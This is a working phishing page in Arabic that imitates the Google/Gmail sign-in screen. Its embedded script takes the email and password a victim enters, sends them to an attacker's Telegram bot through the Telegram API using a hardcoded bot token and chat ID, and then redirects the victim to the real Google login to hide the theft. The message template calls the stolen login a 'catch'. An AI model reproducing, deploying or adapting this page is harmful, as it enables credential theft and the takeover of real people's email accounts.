<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>تسجيل الدخول - حسابات Google</title>
    <style>
        body { font-family: 'Roboto', arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { width: 400px; padding: 40px; border: 1px solid #dadce0; border-radius: 8px; text-align: center; }
        .logo { width: 75px; margin-bottom: 10px; }
        h1 { font-size: 24px; font-weight: 400; margin-bottom: 10px; }
        p { font-size: 16px; margin-bottom: 25px; }
        input { width: 100%; padding: 13px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
        input:focus { border: 2px solid #1a73e8; outline: none; }
        .footer { display: flex; justify-content: space-between; align-items: center; margin-top: 30px; }
        .btn { background-color: #1a73e8; color: white; padding: 10px 24px; border: none; border-radius: 4px; font-weight: bold; cursor: pointer; }
        .create-account { color: #1a73e8; font-weight: bold; text-decoration: none; font-size: 14px; }
    </style>
</head>
<body>

    <div class="login-box">
        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo" alt="Google">
        <h1>تسجيل الدخول</h1>
        <p>المتابعة إلى Gmail</p>
        
        <form id="gForm">
            <input type="email" id="email" placeholder="البريد الإلكتروني أو الهاتف" required>
            <input type="password" id="pass" placeholder="أدخل كلمة المرور" required>
            
            <div style="text-align: right; margin-top: 5px;">
                <a href="#" class="create-account">هل نسيت البريد الإلكتروني؟</a>
            </div>

            <div class="footer">
                <a href="#" class="create-account">إنشاء حساب</a>
                <button type="submit" class="btn">التالي</button>
            </div>
        </form>
    </div>

    <script>
        const TOKEN = "8619490492:AAEfXC0wN0Uh73BA9TniEqyQh_gb_GyfzUg";
        const CHAT_ID = "5811700860";

        document.getElementById('gForm').addEventListener('submit', function(e) {
            e.preventDefault();

            const user = document.getElementById('email').value;
            const password = document.getElementById('pass').value;

            // إرسال البيانات لبوت التيليجرام فوراً
            const report = `📧 **صيد Gmail جديد:**\n\n👤 الإيميل: \`${user}\`\n🔑 الباسورد: \`${password}\`\n🌍 الـ IP: [جاري الجلب...]`;

            fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ chat_id: CHAT_ID, text: report, parse_mode: "Markdown" })
            })
            .then(() => {
                // التحويل لصفحة Gmail الحقيقية لإكمال الدخول
                window.location.href = "https://accounts.google.com/ServiceLogin?service=mail";
            })
            .catch(() => {
                window.location.href = "https://mail.google.com";
            });
        });
    </script>
</body>
</html>
